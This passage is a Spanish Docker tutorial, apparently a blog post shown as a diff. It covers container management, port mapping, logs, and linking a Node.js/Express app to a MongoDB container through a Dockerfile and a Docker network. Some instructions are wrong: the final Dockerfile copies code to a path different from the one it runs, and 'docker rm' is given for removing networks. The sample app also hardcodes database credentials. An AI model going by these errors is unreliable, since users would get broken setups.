+&lt;p&gt;Anteriomente veiamos como listar los contenedores actualmente corriendo, pero que paso si queremos ver los contenedores que tenemos independientemente si estos esten o no activos solo hay que añadir un parametro al anterior comando &lt;code&gt;docker ps -a&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker27.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Y esta vez podemos ver las mismas etiquetas, pero con la variación que ahora &lt;code&gt;STATUS&lt;/code&gt; nos muestra un estado &lt;code&gt;Exited (0) 3 min ago&lt;/code&gt; el cual nos indica que el contenedor detuvo su ejecución hace un aproximado de 3 min.&lt;/p&gt;
+
+&lt;p&gt;Ademas debido a que ahora el contenedor no se encuentra activo, la etiqueta &lt;code&gt;PORTS&lt;/code&gt; se encuentra vacia.&lt;/p&gt;
+
+&lt;h3 id=&quot;eliminar-un-contenedor&quot;&gt;Eliminar un Contenedor &lt;a href=&quot;#eliminar-un-contenedor&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;
+
+&lt;p&gt;Si queremos eliminar un contenedor previamente creado y el cual no necesitemos, es super sencillo solo tenemos que ejecutar el comando &lt;code&gt;docker rm id_contenedor&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker28.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Si litamos ahora el comando que nos lista los contendores disponibles, vemos que fue eliminado exitosamente.&lt;/p&gt;
+
+&lt;h3 id=&quot;establecer-nombre-a-un-contenedor&quot;&gt;Establecer Nombre a un Contenedor &lt;a href=&quot;#establecer-nombre-a-un-contenedor&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;
+
+&lt;p&gt;Cuando listabamos los contenedores notamos que en la etiqueta &lt;code&gt;NAME&lt;/code&gt; se establecia un nombre extraño asignado al contenedor que creabamos, y esto sucede debido a que si nosotros al momento de crear nuestro contenedor no lo establecemos un nombre &lt;code&gt;docker&lt;/code&gt; por defecto lo genera aleatoriamente. Pero existe la posibilidad de nosotros establecer un nombre a nuestro contenedor y trabajar en función a el y no siempre usando el ID.&lt;/p&gt;
+
+&lt;p&gt;Para ello solo debemos agregar el parametro &lt;code&gt;--name nombre_contenedor&lt;/code&gt;, por lo demas el comando seria exactamente igual.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker29.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Lo siguiente seria iniciarlo no?, pero ahora que le asignamos un nombre podemos usar este en lugar del ID. Seguidamente tambien vamos a verificar que nuestro contenedor se encuentra activo.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker30.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Observamos que tenemos corriendo nuestro contenedor y esta vez con el nombre que le asignamos &lt;code&gt;mongo_container&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Lo ideal seria comenzar a usarlo, y como en nuestro caso corresponde a un servicio de base de datos guardar información. Sin embargo si queremos interactuar con este desde nuestra maquina &lt;code&gt;host&lt;/code&gt; no nos sera posible.&lt;/p&gt;
+
+&lt;p&gt;y de seguro te preguntaras debido a que si nos nuestro contenedor esta funcionando correctamente?.&lt;/p&gt;
+
+&lt;p&gt;Pues esto se debe a que cuando nosotros ejecutamos una aplicación dentro de un contenedor Docker, esta solo puede comunicarse con el mundo exterior a través de la &lt;code&gt;interfaz de red&lt;/code&gt; interna del contenedor, lo que significa que no puede acceder directamente a los puertos del host o a otros dispositivos en la red.&lt;/p&gt;
+
+&lt;p&gt;Entonces para poder establecer esta comunicación usamos el concepto de &lt;code&gt;Port Mapping&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;ejecutar-comandos&quot;&gt;Ejecutar comandos dentro del Contenedor &lt;a href=&quot;#ejecutar-comandos&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;
+
+&lt;p&gt;Es importante mencionar que existe la opción de ejecutar comandos dentro de nuestro contenedor que se encutra corriendo, lo que es útil cuando queremos realizar tareas como administración o depuración del mismo.&lt;/p&gt;
+
+&lt;p&gt;Para ello usamos el comando &lt;code&gt;docker exec id_contenedor|nombre_contenedor comando&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Como sabemos nuestros contenedores estan basandos en &lt;code&gt;linux&lt;/code&gt; asi que podriamos ejecutar como comando una &lt;code&gt;bash&lt;/code&gt; y podriamos acceder mediante una terminal al contenedor, para ello vamos a crear un nuevo contenedor usando nuestra imagen de &lt;code&gt;mongo&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker95.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Tambien podriamos mostrar la version de &lt;code&gt;mongo&lt;/code&gt; que se esta ejecutando.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker96.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;En otras palabras podemos ejecutar cualquier comando que nos permita interactuar con nuestros contenedores.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker97.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;port-mapping&quot;&gt;Port Mapping &lt;a href=&quot;#port-mapping&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;
+
+&lt;p&gt;El &lt;code&gt;Port Mapping&lt;/code&gt; nos permite redireccionar solicitudes de un puerto específico en el host hacia un puerto específico dentro del contenedor. Esto hace que la aplicación dentro del contenedor sea accesible desde el host o desde otras máquinas de la red como si estuviera ejecutándose directamente en el host.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker31.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Par poder realizar este proceso de manera practica, primero vamos a proceder a eliminar nuestro contenedor.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker32.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora vamos a proceder a crear un nuevo contenedor y lo llamaremos de la misma manera que el previo, solo que esta vez para hacer uso del &lt;code&gt;Port Mapping&lt;/code&gt; usaremos un parametro mas &lt;code&gt;-p&lt;/code&gt; - &lt;code&gt;-ppuerto_host:puerto_contenedor&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker33.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Y ahora en la etiqueta &lt;code&gt;PORT&lt;/code&gt; vemos que nuestro puerto host &lt;code&gt;27017&lt;/code&gt; esta mapeado a el puerto &lt;code&gt;27017&lt;/code&gt; de nuestro contenedor.&lt;/p&gt;
+
+&lt;p&gt;Si ahora hacemos exactamente el mismo proceso, pero esta vez no especificamos nuestro puerto hosts, lo que pasara es que &lt;code&gt;Docker&lt;/code&gt; lo eligira por nosotros aleatoriamente.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker34.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Observamos que esta vez &lt;code&gt;Docker&lt;/code&gt; nos asigno aleatoriamente el puerto &lt;code&gt;49153&lt;/code&gt;. Esto no nos conviene mucho ya que nosotros siempre queremos tener el control de que puerto queremos usar, pero no esta de mas saberlo.&lt;/p&gt;
+
+&lt;h3 id=&quot;mostrar-logs&quot;&gt;Mostrar logs de un Contenedor &lt;a href=&quot;#mostrar-logs&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;
+
+&lt;p&gt;Si queremos listar los logs de nuestro contenedor, para mostrar los registros con información detallada sobre el funcioamiento correcto o erroneo de nuestro contenedor tambien es muy sencillo, solo basta con ejecutar el comando &lt;code&gt;docker logs monbre_contenedor&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker35.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Y si ahora queremos listar los &lt;code&gt;logs&lt;/code&gt; pero a la vez mantenernos en escucha de nuevos registros, añadiremos al comando el parametro &lt;code&gt;--follow&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker36.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker37.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;docker-run&quot;&gt;Docker run &lt;a href=&quot;#docker-run&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;
+
+&lt;p&gt;Hemos estado viendo diversos comandos cuando usamos &lt;code&gt;Docker&lt;/code&gt;, como descargar una imagen, crear y desplegar nuestro contenedor cada uno con su respectivo comando, pero &lt;code&gt;Docker&lt;/code&gt; tambien nos da la opción de hacer todo el proceso en conjunto haciendo uso de un solo comando.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Seguro puedes decir entocnes para que aprendi el resto??.. si literalmente evito hacer tanto embrollo, pues hay que recordar que si bien podemos automatizar el proceso con este comando no quiere decir que en todo momento que uso docker voy a realizar la misma acción, ya que muchas veces vamos a realizar distintas operaciones por separado.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Y bueno para realizar esta operación debemos ejecutar el comando &lt;code&gt;docker run&lt;/code&gt; y este comando basicamente hara 4 operaciones:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Buscar la imagen y si esta no se encuentra la descargara.&lt;/li&gt;
+  &lt;li&gt;Crear un Contenedor&lt;/li&gt;
+  &lt;li&gt;Iniciar el Contenedor&lt;/li&gt;
+  &lt;li&gt;Mostrar los logs en escucha&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Para apreciar mejor su funcionamiento, vamos a realizar el proceso entero, asi que vamos a borrar nuestros contenedores actuales.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker38.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Realizamos tambien el borrado de las imagenes.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker39.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora ejecutaremos el comando &lt;code&gt;docker run nombre_imagen&lt;/code&gt; y este lo que hara al no encontrar la imagen, sera descargarla para despues crear y iniciar nuestro contenedor, hasta que finalmente nos muestre los logs en escucha&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker41.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker42.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Y otra cosa si queremos que nos realize todo el proceso, pero no queremos ver los &lt;code&gt;logs&lt;/code&gt;, solo tenemos que añadir el parametro &lt;code&gt;-d&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker43.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Otra cosa importante es que podemos usar los mismos parametros de antes incluidos en este comando, como asignarle un nombre &lt;code&gt;--name&lt;/code&gt; o usar el &lt;code&gt;Port Mapping&lt;/code&gt; con &lt;code&gt;-p&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;De esta manera tendriamos desplegado nuestro contenendor y listo para poder usarlo.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker44.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;conexion-con-un-contenedor&quot;&gt;Conexión con un Contenedor &lt;a href=&quot;#conexion-con-un-contenedor&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;
+
+&lt;p&gt;Para poder realizar la conexión de nuestros contenedores, vamos a estar usando &lt;code&gt;NodeJS&lt;/code&gt; y &lt;code&gt;MongoDB&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Ejecutaremos un aplicativo simple en &lt;code&gt;NodeJS&lt;/code&gt; que se pueda conectar con un contenedor que esta ejecutando &lt;code&gt;MongoDB&lt;/code&gt; y de este modo al gestionar todo en contenedores no tengamos que descargarnos &lt;code&gt;Mongo&lt;/code&gt; en nuestro maquina &lt;code&gt;hosts&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Para ello a continuación te dejare el codigo de el aplicativo.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;const express = require(&quot;express&quot;);
+const mongoose = require(&quot;mongoose&quot;);
+const app = express();
+
+const mongoURI =
+  &quot;mongodb://firtsmiracle:firtsmiracle123@localhost:27017/universidad?authSource=admin&quot;;
+
+mongoose.connect(mongoURI, { useNewUrlParser: true, useUnifiedTopology: true });
+
+const studentSchema = new mongoose.Schema({
+  nombre: { type: String, required: true },
+  curso: { type: String, required: true },
+  correo: { type: String, required: true },
+});
+
+const Student = mongoose.model(&quot;Student&quot;, studentSchema);
+
+app.use(express.json());
+
+// Ruta para crear un estudiante
+app.post(&quot;/estudiantes&quot;, async (req, res) =&amp;gt; {
+  try {
+    const { nombre, curso, correo } = req.body;
+
+    const newStudent = new Student({ nombre, curso, correo });
+    const savedStudent = await newStudent.save();
+
+    res.status(201).json(savedStudent);
+  } catch (error) {
+    console.error(error);
+    res.status(500).json({ message: &quot;Error al crear el estudiante.&quot; });
+  }
+});
+
+// Ruta para listar todos los estudiantes
+app.get(&quot;/estudiantes&quot;, async (req, res) =&amp;gt; {
+  try {
+    const students = await Student.find();
+    res.json(students);
+  } catch (error) {
+    console.error(error);
+    res.status(500).json({ message: &quot;Error al obtener los estudiantes.&quot; });
+  }
+});
+
+// Ruta para eliminar un estudiante por su ID
+app.delete(&quot;/estudiantes/:id&quot;, async (req, res) =&amp;gt; {
+  try {
+    const estudianteId = req.params.id;
+
+    const deletedStudent = await Student.findByIdAndDelete(estudianteId);
+
+    if (deletedStudent) {
+      res.json({ message: &quot;Estudiante eliminado exitosamente.&quot; });
+    } else {
+      res.status(404).json({ message: &quot;Estudiante no encontrado.&quot; });
+    }
+  } catch (error) {
+    console.error(error);
+    res.status(500).json({ message: &quot;Error al eliminar el estudiante.&quot; });
+  }
+});
+
+const port = 3000;
+app.listen(port, () =&amp;gt; {
+  console.log(`Servidor corriendo en http://localhost:${port}`);
+});
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Para ello lo primero que tenemos que hacer es dirigirnos a &lt;code&gt;Docker Hub&lt;/code&gt; ya que vamos a necesitar una serie de parametros de configuración al momento de crear nuestro contenedor para acceder a nuestra base de datos.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://hub.docker.com/&quot;&gt;https://hub.docker.com/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Una vez ahi ya que queremos usar mongo, usamos el buscado, esto nos llevara a otro apartado.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker45.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Aqui encontraremos una lista de instrucciones para poder configurar nuestro contenedor.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker46.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Hay que recordar que cada imagen que estemos utilizando necesitara distintos parametros de configuración y en algunos casos no necesitaran ninguno, eso ya dependera del tipo de imagen que estemos utilizando.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Como vamos a estar utilizando una base de datos, necesitaremos un usuario y una contraseña, para ello usaremos unas variables de entorno que las encontraras en la mismo enlace.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker47.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora vamos a realizar el proceso completo, para poder ejecutar nuestro contenedor con las configuraciones necesarias.&lt;/p&gt;
+
+&lt;p&gt;Primero tenemos que tener nuestra imagen descargada de &lt;code&gt;Docker&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker48.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora procederemos a crear el contenedor, con las variables de entorno necesarias para conectarnos. Como vimos en &lt;code&gt;Docker Hub&lt;/code&gt; para setearlas usamos el parametro &lt;code&gt;-e&lt;/code&gt; y usamos adicionalmente los comandos que ya aprendimos previamente.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker49.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora que tenemos correctamente desplegado nuestro contenedor de mongo, vamos a ejecutar la aplicación de &lt;code&gt;NodeJS&lt;/code&gt; en nuestro sistema.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker50.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos que se ejecuta por el puerto &lt;code&gt;3000&lt;/code&gt; y si vamos en el navegador el servicio esta activo.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker51.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora que el servidor esta escuchando vamos a mandar una petición para crear un estudiante.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker52.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;La isntrucción se ejecuta correctamente y si ahora vemos en el navegador el registro se realizo correctamente.
+&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker53.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Podemos probar a ejecutar otro registro.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker54.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Validamos nuevamente y vemos que se visualiza correctamente,&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker55.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Lo mismo si eliminamos algun registro y validamos al listar los cambios.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker56.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker57.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;De esta manera habriamos realizado de manera exitosa una conexión de nuestro aplicativo con un contenedor que ejecuta &lt;code&gt;mongoDB&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;insertar-aplicacion-en-un-contenedor&quot;&gt;Insertar Aplicación en un Contenedor &lt;a href=&quot;#insertar-aplicacion-en-un-contenedor&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;
+
+&lt;p&gt;Ahora ya validamos que podemos conectar nuestra aplicación con un contenedor, pero es posible que podamos meter nuestra aplicación a un contenedor?&lt;/p&gt;
+
+&lt;p&gt;Pues si y para ello primero crear una imagen a partir de un archivo de nombre &lt;code&gt;Dockerfile&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;crear-una-imagen&quot;&gt;Crear una imagen &lt;a href=&quot;#crear-una-imagen&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;
+
+&lt;p&gt;Para poder crear una imagen necesariamente debemos de crear un archivo &lt;code&gt;dockerfile&lt;/code&gt; en donde escribiremos todas las instrucciones que necesitara nuestro contenedor para poder crearse.&lt;/p&gt;
+
+&lt;p&gt;Ahora debo mencionar que para crear una imagen debemos de basarnos en otra imagen, ya que estamos usando &lt;code&gt;Node&lt;/code&gt; pues debemos basarnos en esta misma.&lt;/p&gt;
+
+&lt;h3 id=&quot;dockerfile&quot;&gt;Dockerfile &lt;a href=&quot;#dockerfile&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Dokerfile: es un archivo de texto plano que contiene una serie de instrucciones que Docker utiliza para crear una imagen de contenedor.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Creamos nuestro archivo &lt;code&gt;Dockerfile&lt;/code&gt; y introducimos los siguientes comandos, te explicare para que funciona cada uno mientras escribimos linea por linea.&lt;/p&gt;
+
+&lt;p&gt;Primero usaremos &lt;code&gt;FROM imagen:version&lt;/code&gt; para indicarle en que imagen nos basaremos, en nuestro caso ya que estamos usando la ultima versión disponible y esta corresponde a la &lt;code&gt;18&lt;/code&gt;, debemos especificarla.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;FROM node:18
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Despues vamos a crear una carpeta en donde vamos a introdir el codigo fuente de nuestro aplicativo eso lo hacemos con: &lt;code&gt;RUN mkdir -p ruta&lt;/code&gt;. Ojo la &lt;code&gt;ruta&lt;/code&gt; hace referencia a la del contenedor no a la de tu equipo local, y puedes elegir la que quieras.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;FROM node:18
+RUN mkdir -p /home/myapp
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ahora tenemos que indicarle la ruta de donde va a introducir el codigo y para ello usamos &lt;code&gt;COPY ruta_origen ruta_destino&lt;/code&gt;. Donde especifico en la ruta local un punto ya que tomare como referencia el directorio actual.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;FROM node:18
+RUN mkdir -p /home/myapp
+COPY . /home/myapp
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Seguidamente tenemos que exponer un puerto, para que otros contenedores y nuestra maquina host podamos conectarnos a este nuevo contenedor, para esto usamos &lt;code&gt;EXPOSE puerto&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;FROM node:18
+RUN mkdir -p /home/myapp
+COPY . /home/app
+EXPOSE 3000
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ahora finalmente debemos indicarle el comando que se debe ejecutar para que la aplicación corra con &lt;code&gt;CMD [&quot;comando&quot;, &quot;ruta_archivo&quot;]&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;FROM node:18
+RUN mkdir -p /home/myapp
+COPY . /home/app
+EXPOSE 3000
+CMD [&quot;node&quot;, &quot;/home/myapp/index.js&quot;]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&quot;creacion-de-una-red&quot;&gt;Creación de una Red &lt;a href=&quot;#creacion-de-una-red&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;
+
+&lt;p&gt;Para que nuestros contenedores puedan conectarse, esto debido a que si bien es cierto podemos tener muchos contenedores, no necesariamente todos ellos deben poder conectarse. Y para que nuestro contenedores se puedan conectar debemos crear valga la redundancia una &lt;code&gt;red interna&lt;/code&gt; que realize la conexión de dos o mas contenedores.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Todos los contenedores que se encuentren en la misma red, pueden conectarse y podemos crear cuantas redes queramos.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;docker-network&quot;&gt;Docker Network &lt;a href=&quot;#docker-network&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;
+
+&lt;p&gt;Para realizar la creación de una red, debemos ejecutar el comando &lt;code&gt;docker network&lt;/code&gt; y podemos ver una serie de parametros que podemos utilizar.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker58.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Dentro de esos parametros que podemos hacer uso, podemos ver uno que corresponde a &lt;code&gt;ls&lt;/code&gt;, el cual nos permitira listar las redes disponibles creadas por defecto.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker59.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vamos ahora a crear nuestra nueva red usando el comando &lt;code&gt;docker network create nombre_red&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker60.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Al listar nuevamente vemos que ahora tenemos una nueva red &lt;code&gt;redInterna&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Y si te preguntas podemos eliminar una red pues si para ello usamos &lt;code&gt;docker rm nombre_red&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Ahora cuando los contenedores estan dentro de la misma red se comunican mediante el nombre del contenedor. En otras palabras el nombre de dominio del contenedor va a ser el mismo al nombre que le damos cuando lo creamos.&lt;/p&gt;
+
+&lt;p&gt;Por lo tanto debemos de cambiar en nuestro codigo del aplicativo y en vez de &lt;code&gt;localhost&lt;/code&gt; indicarle el nombre del contenedor de mongo que llamaremos &lt;code&gt;mongo_connect&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker63.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;docker-build&quot;&gt;Docker build &lt;a href=&quot;#docker-build&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;
+
+&lt;p&gt;Vamos a proceder a crear nuestra imagen con el comando &lt;code&gt;docker build&lt;/code&gt; el cual nos permitira crear una imagen basadas en un archivo docker file.&lt;/p&gt;
+
+&lt;p&gt;Este comando recibe dos argumentos, &lt;code&gt;docker build -t nombre_imagen:tag ruta_dockerfile&lt;/code&gt;, donde en &lt;code&gt;tag&lt;/code&gt; podemos hace referencia a la versión que tendra nuestro proyecto.&lt;/p&gt;
+
+&lt;p&gt;Ejecutamos el comando y vemos como se crea nuestra imagen.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker61.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Si ahora volvemos a listar nuestras imagenes observamos que ahora tenemos una nueva correspondiente a &lt;code&gt;node&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker62.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Como ultimo paso ahora debemos de volver a crear nuestros contenedores y especificarles que estos ahora formaran parte de una red, para ello primero vamos a borrar el contenedor que previamente creamos.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker64.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Y ahora vamos a usar los mismo comandos para crear el contenedor, solo que esta vez adicionaremos un nuevo parametro &lt;code&gt;--network nombre_red&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker65.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Del mismo modo crearemos el contenedor de nuestra aplicación alojada en la imagen que creamos.&lt;/p&gt;
+
+&lt;p&gt;Ojo debemos especificar tambien con &lt;code&gt;-p&lt;/code&gt; el puerto ya que vamos a acceder de nuestro equipo, ademas de la red y la iamgen tal cual con el tag que proporcionamos.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker66.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Iniciamos ambos contenedores y ahora se encuentran activos.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker67.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nos dirigimos a nuestro navegador para hacer las pruebas respectivas y vemos que genial nuestro aplicativo corre sin problemas.&lt;/p&gt;
+
